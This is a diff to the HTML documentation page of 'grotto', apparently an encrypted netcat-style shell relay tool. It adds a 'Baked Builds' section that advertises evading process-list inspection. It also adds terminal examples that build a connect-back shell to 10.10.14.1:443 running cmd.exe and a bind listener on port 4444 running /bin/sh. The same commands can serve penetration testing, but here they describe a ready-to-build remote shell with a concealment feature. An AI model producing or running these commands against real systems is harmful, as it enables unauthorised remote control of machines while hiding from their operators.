@@ -1055,8 +1055,8 @@
 
       <div class="feature-card">
         <span class="feature-icon" aria-hidden="true">&#128293;</span>
-        <h3>Threaded + Poll Architectures</h3>
-        <p>Windows uses CreateThread with WaitForMultipleObjects for concurrent relay. Linux uses poll(2) for single-threaded multiplexed I/O. Both handle EOF cleanly.</p>
+        <h3>Baked Builds</h3>
+        <p>Compile host, port, key, and exec command directly into the binary. Zero arguments at runtime &mdash; nothing visible in the process list. A random PSK is generated if none is provided.</p>
       </div>
     </div>
   </section>
@@ -1254,6 +1254,33 @@
         <div class="start-line"><span class="prompt">$</span> <span class="cmd">./grotto </span><span class="flag">-l -p </span><span class="arg">4444 </span><span class="flag">-k </span><span class="arg">$KEY </span><span class="flag">-e </span><span class="str">/bin/sh</span></div>
         <div class="start-spacer"></div>
         <div class="start-line"><span class="comment"># Outputs: build/grotto (ELF) + build/grotto.exe (PE)</span></div>
+      </div>
+    </div>
+
+    <h3 style="color: var(--ctp-mauve); margin-top: 48px; font-size: 1.15rem; letter-spacing: 0.5px;">Baked Builds</h3>
+    <p class="section-desc" style="margin-top: 8px;">
+      Compile configuration directly into the binary &mdash; no CLI arguments needed, nothing visible in the process list.
+    </p>
+
+    <div class="start-terminal">
+      <div class="start-titlebar">
+        <span class="hero-dot hero-dot--red"></span>
+        <span class="hero-dot hero-dot--yellow"></span>
+        <span class="hero-dot hero-dot--green"></span>
+        <span class="start-titlebar-text">bash &mdash;&mdash; baked builds</span>
+      </div>
+      <div class="start-body">
+        <div class="start-line"><span class="comment"># Baked connect-back with encrypted shell</span></div>
+        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./build.sh </span><span class="flag">--baked </span><span class="flag">-c </span><span class="arg">10.10.14.1 </span><span class="flag">-p </span><span class="arg">443 </span><span class="flag">-e </span><span class="str">cmd.exe</span></div>
+        <div class="start-spacer"></div>
+        <div class="start-line"><span class="comment"># Baked listener</span></div>
+        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./build.sh </span><span class="flag">--baked </span><span class="flag">-l </span><span class="flag">-p </span><span class="arg">4444 </span><span class="flag">-e </span><span class="str">/bin/sh</span></div>
+        <div class="start-spacer"></div>
+        <div class="start-line"><span class="comment"># Baked with explicit key</span></div>
+        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./build.sh </span><span class="flag">--baked </span><span class="flag">-c </span><span class="arg">10.10.14.1 </span><span class="flag">-p </span><span class="arg">443 </span><span class="flag">-k </span><span class="arg">&lt;64-hex-chars&gt; </span><span class="flag">-e </span><span class="str">cmd.exe</span></div>
+        <div class="start-spacer"></div>
+        <div class="start-line"><span class="comment"># Binary runs with zero arguments &mdash; config embedded at compile time</span></div>
+        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./grotto</span>  <span class="comment"># that's it. no flags, nothing in process list.</span></div>
       </div>
     </div>
   </section>
